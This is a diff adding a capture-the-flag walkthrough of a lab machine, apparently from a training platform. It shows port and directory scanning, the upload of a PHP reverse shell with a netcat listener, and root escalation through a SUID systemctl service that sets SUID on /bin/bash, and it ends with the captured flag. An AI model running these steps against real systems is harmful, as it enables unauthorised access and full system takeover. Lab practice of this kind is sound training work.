@@ -1,0 +1,116 @@
+ATTACKER = 10.114.174.216
+TARGET = 10.114.186.115
+
+nmap -sV 10.114.186.115
+
+6 ports open, the main thing we found is a web server running on port 3333
+
+they want us to use gobuster for directory enumeration
+sudo apt-get install gobuster
+
+
+basic command syntax is gobuster dir -u URL -w WORDLIST
+
+gobuster dir -u http://10.114.186.115:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+
+/images               (Status: 301) [Size: 324] [--> http://10.114.186.115:3333/images/]
+/css                  (Status: 301) [Size: 321] [--> http://10.114.186.115:3333/css/]
+/js                   (Status: 301) [Size: 320] [--> http://10.114.186.115:3333/js/]
+/internal             (Status: 301) [Size: 326]
+
+
+first 3 are common, so we know where to go...
+/internal has file upload
+
+
+we download php revshell from pentestmonkey, rename it to shell.phtml and change the IP to ATTACKER, we leave the port as 1234.
+then upload it to /internal
+go to terminal and run nc -lvnp 1234
+
+then go to the browser and click on the shell.phtml file, we get a reverse shell.
+
+now we cd to home and find user bill (for a task)
+then search for files with SUID bit set and find /bin/systemctl
+Go to gtfobins on web and search systemctl, switch to tab SUID and copy the code.
+
+echo '[Service]
+Type=oneshot
+ExecStart=/path/to/command
+[Install]
+WantedBy=multi-user.target' >/path/to/temp-file.service
+systemctl link /path/to/temp-file.service
+systemctl enable --now /path/to/temp-file.service
+
+and change it to
+
+# creating service in /tmp
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > /tmp/root-esc.service
+
+# link and run
+systemctl link /tmp/root-esc.service
+systemctl enable --now /tmp/root-esc.service
+
+
+if we try to run this we realise there is no service running /bin/bash in privileged mode so we create that
+
+echo -e '[Unit]\nDescription=Elevated Shell\n\n[Service]\nType=oneshot\nExecStart=/bin/bash\n\n[Install]\nWantedBy=multi-user.target' > /tmp/elevated-shell.service
+
+we link the service:
+systemctl link /tmp/elevated-shell.service
+and enable and start it:
+systemctl enable --now elevated-shell.service
+
+now we just have to
+/bin/bash -p
+and we are root, we can cd to root and cat root.txt
+thats it.
+
+FINAL Privilege Escalation complete (all comands that i ran to get root put together) - had to get help from AI though:
+
+echo -e '[Unit]\nDescription=Elevated Shell\n\n[Service]\nType=oneshot\nExecStart=/bin/bash\n\n[Install]\nWantedBy=multi-user.target' > /tmp/elevated-shell.service
+
+systemctl link /tmp/elevated-shell.service
+### Created symlink /etc/systemd/system/elevated-shell.service -> /tmp/elevated-shell.service.
+
+systemctl enable --now elevated-shell.service
+###  Created symlink /etc/systemd/system/multi-user.target.wants/elevated-shell.service -> /tmp/elevated-shell.service.
+
+systemctl start elevated-shell.service
+
+systemctl status elevated-shell.service
+* elevated-shell.service - Elevated Shell
+     Loaded: loaded (/etc/systemd/system/elevated-shell.service; enabled; vendor preset: enabled)
+     Active: inactive (dead) since Wed 2026-06-24 10:18:39 EDT; 9s ago
+    Process: 3314 ExecStart=/bin/bash (code=exited, status=0/SUCCESS)
+   Main PID: 3314 (code=exited, status=0/SUCCESS)
+
+Jun 24 10:18:39 ip-10-113-144-188 systemd[1]: Starting Elevated Shell...
+Jun 24 10:18:39 ip-10-113-144-188 systemd[1]: elevated-shell.service: Succeeded.
+Jun 24 10:18:39 ip-10-113-144-188 systemd[1]: Finished Elevated Shell.
+
+# creating service in /tmp
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > /tmp/root-esc.service
+
+# link and run
+systemctl link /tmp/root-esc.service
+
+systemctl enable --now /tmp/root-esc.service
+### Created symlink /etc/systemd/system/multi-user.target.wants/root-esc.service -> /tmp/root-esc.service.
+
+/bin/bash -p
+cd root
+
+ls
+### root.txt
+### snap
+
+cat root.txt
+### a58ff8579f0a9270368d33a9966c7fd5
